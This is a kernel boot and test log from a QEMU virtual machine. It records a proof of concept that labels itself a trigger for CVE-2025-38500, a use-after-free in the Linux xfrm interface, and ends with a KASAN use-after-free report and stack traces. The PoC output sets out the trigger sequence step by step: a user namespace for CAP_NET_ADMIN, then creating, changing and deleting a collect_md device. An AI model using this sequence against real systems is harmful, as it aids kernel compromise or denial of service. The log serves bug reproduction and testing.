bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 6.6.100-g2e18442d22c6-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 17:00:07 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 303497782 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000003] tsc: Detected 3187.200 MHz processor
[    0.000311] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000328] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000330] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002024] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002031] Using GB pages for direct mapping
[    0.002109] RAMDISK: [mem 0x7fe92000-0x7ffdffff]
[    0.002113] ACPI: Early table checksum verification disabled
[    0.002115] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002117] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002121] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002125] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002127] ACPI: FACS 0x000000007FFE0000 000040
[    0.002128] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002129] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002131] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002132] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002133] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002134] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002134] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002135] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002135] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002304] No NUMA configuration found
[    0.002304] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002306] NODE_DATA(0) allocated [mem 0x7fe8e000-0x7fe91fff]
[    0.002313] Zone ranges:
[    0.002313]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002314]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002315]   Normal   empty
[    0.002316] Movable zone start for each node
[    0.002316] Early memory node ranges
[    0.002316]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002317]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002318] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.004049] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.004083] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.024737] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.232483] kasan: KernelAddressSanitizer initialized
[    0.232687] ACPI: PM-Timer IO Port: 0x608
[    0.232695] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.232723] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.232725] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.232726] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.232727] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.232728] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.232728] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.232730] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.232731] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.232733] TSC deadline timer available
[    0.232734] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.232747] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.232760] kvm-guest: KVM setup pv remote TLB flush
[    0.232762] kvm-guest: setup PV sched yield
[    0.232767] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.232769] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x000fffff]
[    0.232770] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.232771] Booting paravirtualized kernel on KVM
[    0.232773] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.240693] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.243108] percpu: Embedded 66 pages/cpu s232872 r8192 d29272 u1048576
[    0.243137] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.243177] random: crng init done
[    0.243272] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.247185] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.247216] Fallback order for Node 0: 0 
[    0.247219] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    0.247220] Policy zone: DMA32
[    0.247221] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.247222] stackdepot: allocating hash table via alloc_large_system_hash
[    0.252000] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.271336] Memory: 1690656K/2096632K available (49152K kernel code, 8041K rwdata, 10328K rodata, 5704K init, 2712K bss, 405720K reserved, 0K cma-reserved)
[    0.271454] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.272406] Dynamic Preempt: voluntary
[    0.273858] rcu: Preemptible hierarchical RCU implementation.
[    0.273859] rcu: 	RCU event tracing is enabled.
[    0.273860] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.273861] 	Trampoline variant of Tasks RCU enabled.
[    0.273862] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.273862] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.281025] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.281253] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.283459] Console: colour VGA+ 80x25
[    0.283484] printk: console [ttyS0] enabled
[    0.318766] ACPI: Core revision 20230628
[    0.319100] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.319662] APIC: Switch to symmetric I/O mode setup
[    0.319942] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.320345] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.320865] kvm-guest: setup PV IPIs
[    0.321681] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.322027] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.322611] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.323686] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.324096] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.324609] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.324941] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.325611] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on vm exit
[    0.325999] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall
[    0.326386] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.326609] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.327027] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.327610] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.328085] MMIO Stale Data: Unknown: No mitigations
[    0.328365] Register File Data Sampling: Vulnerable: No microcode
[    0.328609] ITS: Mitigation: Aligned branch/return thunks
[    0.328924] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.329364] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.329611] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.329978] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.330610] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.330965] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.331324] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.353786] Freeing SMP alternatives memory: 48K
[    0.354089] pid_max: default: 32768 minimum: 301
[    0.354393] LSM: initializing lsm=capability,selinux,integrity
[    0.354616] SELinux:  Initializing.
[    0.354874] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.355302] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.356955] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.357609] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.357627] Performance Events: unsupported p6 CPU model 183 no PMU driver, software events only.
[    0.358154] signal: max sigframe size: 3632
[    0.358425] rcu: Hierarchical SRCU implementation.
[    0.358610] rcu: 	Max phase no-delay instances is 400.
[    0.360576] smp: Bringing up secondary CPUs ...
[    0.360716] smpboot: x86: Booting SMP configuration:
[    0.361007] .... node  #0, CPUs:      #1
[    0.361159] smp: Brought up 1 node, 2 CPUs
[    0.361611] smpboot: Max logical packages: 1
[    0.361867] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.362611] devtmpfs: initialized
[    0.364695] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.365259] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.365711] PM: RTC time: 17:02:17, date: 2026-05-05
[    0.366110] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.366648] audit: initializing netlink subsys (disabled)
[    0.367000] audit: type=2000 audit(1778000538.301:1): state=initialized audit_enabled=0 res=1
[    0.367000] thermal_sys: Registered thermal governor 'step_wise'
[    0.367138] thermal_sys: Registered thermal governor 'user_space'
[    0.367622] cpuidle: using governor menu
[    0.368423] PCI: Using configuration type 1 for base access
[    0.368737] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.371719] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.372045] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.372705] ACPI: Added _OSI(Module Device)
[    0.372920] ACPI: Added _OSI(Processor Device)
[    0.373183] ACPI: Added _OSI(Processor Aggregator Device)
[    0.378670] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.384432] ACPI: _OSC evaluation for CPUs failed, trying _PDC
[    0.385182] ACPI: Interpreter enabled
[    0.385427] ACPI: PM: (supports S0 S3 S4 S5)
[    0.385610] ACPI: Using IOAPIC for interrupt routing
[    0.385923] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.386447] PCI: Using E820 reservations for host bridge windows
[    0.386923] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.396820] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.397186] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.397611] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.398214] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.398756] PCI host bridge to bus 0000:00
[    0.398995] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.399389] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.399611] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.400043] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.400475] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.401612] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.401976] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.406023] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.410070] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.411372] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    0.411971] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.412381] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.412611] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.413020] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.413537] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.413836] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.414260] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.414758] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    0.415616] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    0.416798] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    0.419615] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    0.420057] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.424440] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    0.424941] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    0.425583] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    0.427050] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    0.431890] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.432581] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.433944] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.434625] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.435108] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.436324] iommu: Default domain type: Translated
[    0.436605] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.436773] SCSI subsystem initialized
[    0.437684] ACPI: bus type USB registered
[    0.437966] usbcore: registered new interface driver usbfs
[    0.437966] usbcore: registered new interface driver hub
[    0.437966] usbcore: registered new device driver usb
[    0.438282] pps_core: LinuxPPS API ver. 1 registered
[    0.438570] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.439617] PTP clock support registered
[    0.439869] Advanced Linux Sound Architecture Driver Initialized.
[    0.440629] NetLabel: Initializing
[    0.440831] NetLabel:  domain hash size = 128
[    0.441098] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.441479] NetLabel:  unlabeled traffic allowed by default
[    0.441638] PCI: Using ACPI for IRQ routing
[    0.441938] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.441969] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.442305] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.442610] vgaarb: loaded
[    0.442822] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.443110] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.446656] clocksource: Switched to clocksource kvm-clock
[    0.448121] VFS: Disk quotas dquot_6.6.0
[    0.448366] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.448841] pnp: PnP ACPI init
[    0.449992] pnp: PnP ACPI: found 6 devices
[    0.458556] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.459105] NET: Registered PF_INET protocol family
[    0.459434] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.460237] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.460736] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.461195] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.461665] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.462107] TCP: Hash tables configured (established 16384 bind 16384)
[    0.462511] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.462898] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.463365] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.463844] RPC: Registered named UNIX socket transport module.
[    0.464186] RPC: Registered udp transport module.
[    0.464461] RPC: Registered tcp transport module.
[    0.464732] RPC: Registered tcp-with-tls transport module.
[    0.465048] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.465768] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.466128] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.466486] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.466880] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.467274] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.467756] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.468094] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.468465] PCI: CLS 0 bytes, default 64
[    0.470588] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.471079] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.471725] Unpacking initramfs...
[    0.472652] Initialise system trusted keyrings
[    0.472999] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.473667] NFS: Registering the id_resolver key type
[    0.473981] Key type id_resolver registered
[    0.474236] Key type id_legacy registered
[    0.474526] 9p: Installing v9fs 9p2000 file system support
[    0.479565] Key type asymmetric registered
[    0.479835] Asymmetric key parser 'x509' registered
[    0.480150] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.480604] io scheduler mq-deadline registered
[    0.480875] io scheduler kyber registered
[    0.481412] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.482870] ACPI: button: Power Button [PWRF]
[    0.483437] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.483963] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.484588] Freeing initrd memory: 1336K
[    0.485139] Non-volatile memory driver v1.3
[    0.485413] Linux agpgart interface v0.103
[    0.485770] ACPI: bus type drm_connector registered
[    0.488489] loop: module loaded
[    0.489656] scsi host0: ata_piix
[    0.490055] scsi host1: ata_piix
[    0.490337] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    0.490747] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    0.491613] e100: Intel(R) PRO/100 Network Driver
[    0.491896] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.492245] e1000: Intel(R) PRO/1000 Network Driver
[    0.492540] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.649659] ata2: found unknown device (class 0)
[    0.650303] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.651297] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.667620] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.668019] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.674174] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.781754] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.070762] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.071164] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.073371] e1000e: Intel(R) PRO/1000 Network Driver
[    1.073667] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.074045] sky2: driver version 1.30
[    1.074669] usbcore: registered new interface driver usblp
[    1.075021] usbcore: registered new interface driver usb-storage
[    1.075440] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.076361] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.076657] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.077160] rtc_cmos 00:05: RTC can wake from S4
[    1.077926] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.078538] rtc_cmos 00:05: registered as rtc0
[    1.078869] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.079572] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    1.080127] intel_pstate: CPU model not supported
[    1.080433] hid: raw HID events driver (C) Jiri Kosina
[    1.081154] usbcore: registered new interface driver usbhid
[    1.081479] usbhid: USB HID core driver
[    1.083487] Initializing XFRM netlink socket
[    1.083750] IPsec XFRM device driver
[    1.083993] NET: Registered PF_INET6 protocol family
[    1.084663] Segment Routing with IPv6
[    1.084890] In-situ OAM (IOAM) with IPv6
[    1.085164] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.085729] NET: Registered PF_PACKET protocol family
[    1.086058] 9pnet: Installing 9P2000 support
[    1.086330] Key type dns_resolver registered
[    1.086815] IPI shorthand broadcast: enabled
[    1.095959] sched_clock: Marking stable (1056000914, 39351173)->(1097780648, -2428561)
[    1.096534] registered taskstats version 1
[    1.096779] Loading compiled-in X.509 certificates
[    1.104417] PM:   Magic number: 10:134:36
[    1.104665] bdi 7:1: hash matches
[    1.104865] misc loop-control: hash matches
[    1.105136] printk: console [netcon0] enabled
[    1.105394] netconsole: network logging started
[    1.105740] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.106336] kworker/u4:0 (51) used greatest stack depth: 29536 bytes left
[    1.106963] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.107417] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.107839] ALSA device list:
[    1.108014]   No soundcards found.
[    1.108403] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.108738] cfg80211: failed to load regulatory.db
[    1.109522] Freeing unused kernel image (initmem) memory: 5704K
[    1.109760] Write protecting the kernel read-only data: 61440k
[    1.110308] Freeing unused kernel image (rodata/data gap) memory: 1960K
[    1.118591] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.118883] Run /init as init process
[    1.119999] mount (55) used greatest stack depth: 28720 bytes left

secb: rootfs ready
---- poc begin ----
poc: starting CVE-2025-38500 trigger
poc: userns ready (CAP_NET_ADMIN acquired)
poc: NETLINK_ROUTE opened fd=3
poc: create xfrm0 (collect_md) -> err=0 (ack)
poc: created xfrm0 with IFLA_XFRM_COLLECT_METADATA=1
poc: change xfrm0 -> non-collect_md -> err=0 (ack)
poc: xfrmi_changelink done (stale collect_md_xfrmi)
poc: delete xfrm0 -> err=0 (ack)
poc: RTM_DELLINK freed xfrm_if (UAF armed)
poc: create new collect_md xfrm (deref stale ptr) -> err=0 (ack)
poc: create new collect_md xfrm (deref stale ptr) -> err=-17 (File exists)
poc: create new collect_md xfrm (deref stale ptr) [    1.135612] poc (61) used greatest stack depth: 26544 bytes left
-> err=-17 (File exists)
poc: create new collect_md xfrm (deref stale ptr) -> err=-17 (File exists)
poc: triggered collect_md lookups over stale pointer
poc: create xfrm1 (collect_md) -> err=-17 (File exists)
poc: change xfrm1 -> non-collect_md -> err=-19 (No such device)
poc: delete xfrm1 -> err=-19 (No such device)
poc: create xfrm2 (collect_md) -> err=-17 (File exists)
poc: done (no crash observed)
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    1.162712] ==================================================================
[    1.164005] BUG: KASAN: slab-use-after-free in xfrmi_exit_batch_net+0x229/0x290
[    1.165576] Read of size 8 at addr ffff88800986e908 by task kworker/u4:0/11
[    1.166931] 
[    1.167310] CPU: 0 PID: 11 Comm: kworker/u4:0 Not tainted 6.6.100-g2e18442d22c6-dirty #1
[    1.169292] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.171455] Workqueue: netns cleanup_net
[    1.172457] Call Trace:
[    1.172974]  <TASK>
[    1.173426]  dump_stack_lvl+0x36/0x50
[    1.174285]  print_report+0xcf/0x630
[    1.175081]  ? xfrmi_exit_batch_net+0x229/0x290
[    1.176077]  kasan_report+0xc7/0x100
[    1.176841]  ? xfrmi_exit_batch_net+0x229/0x290
[    1.177871]  xfrmi_exit_batch_net+0x229/0x290
[    1.178559]  ? __pfx_xfrmi_exit_batch_net+0x10/0x10
[    1.179282]  ? xt_find_table+0x12b/0x170
[    1.179905]  cleanup_net+0x44a/0xab0
[    1.180421]  ? __pfx_cleanup_net+0x10/0x10
[    1.180987]  ? __pfx___schedule+0x10/0x10
[    1.182364]  ? _raw_spin_lock_irq+0x81/0xe0
[    1.183438]  ? __pfx__raw_spin_lock_irq+0x10/0x10
[    1.184643]  process_one_work+0x58e/0xe60
[    1.185683]  worker_thread+0x85c/0x15c0
[    1.186698]  ? __pfx_worker_thread+0x10/0x10
[    1.187801]  kthread+0x29b/0x370
[    1.188668]  ? __pfx_kthread+0x10/0x10
[    1.189644]  ret_from_fork+0x2f/0x70
[    1.190598]  ? __pfx_kthread+0x10/0x10
[    1.191572]  ret_from_fork_asm+0x1b/0x30
[    1.192867]  </TASK>
[    1.193679] 
[    1.194266] Allocated by task 61:
[    1.195435]  kasan_save_stack+0x33/0x60
[    1.196588]  kasan_set_track+0x25/0x30
[    1.197567]  __kasan_kmalloc+0x8f/0xa0
[    1.198268]  __kmalloc_node+0x5f/0x160
[    1.198593]  alloc_netdev_mqs+0x5f/0x1040
[    1.198932]  rtnl_create_link+0xac9/0xe50
[    1.199278]  __rtnl_newlink+0xd77/0x1580
[    1.199611]  rtnl_newlink+0x5d/0x90
[    1.199910]  rtnetlink_rcv_msg+0x368/0xa20
[    1.200261]  netlink_rcv_skb+0x12f/0x370
[    1.200594]  netlink_unicast+0x73f/0xa80
[    1.200925]  netlink_sendmsg+0x7b7/0xc70
[    1.201260]  ____sys_sendmsg+0x823/0xa00
[    1.201502]  ___sys_sendmsg+0x100/0x180
[    1.201715]  __sys_sendmsg+0xe6/0x190
[    1.201919]  do_syscall_64+0x38/0x80
[    1.202124]  entry_SYSCALL_64_after_hwframe+0x78/0xe2
[    1.202401] 
[    1.202494] Freed by task 61:
[    1.202663]  kasan_save_stack+0x33/0x60
[    1.202877]  kasan_set_track+0x25/0x30
[    1.203089]  kasan_save_free_info+0x2b/0x50
[    1.203319]  __kasan_slab_free+0x10a/0x180
[    1.203546]  __kmem_cache_free+0x82/0x1c0
[    1.203767]  device_release+0x97/0x210
[    1.203978]  kobject_put+0x14e/0x280
[    1.204184]  netdev_run_todo+0x4a7/0xc30
[    1.204402]  rtnetlink_rcv_msg+0x370/0xa20
[    1.204628]  netlink_rcv_skb+0x12f/0x370
[    1.204845]  netlink_unicast+0x73f/0xa80
[    1.205064]  netlink_sendmsg+0x7b7/0xc70
[    1.205282]  ____sys_sendmsg+0x823/0xa00
[    1.205499]  ___sys_sendmsg+0x100/0x180
[    1.205711]  __sys_sendmsg+0xe6/0x190
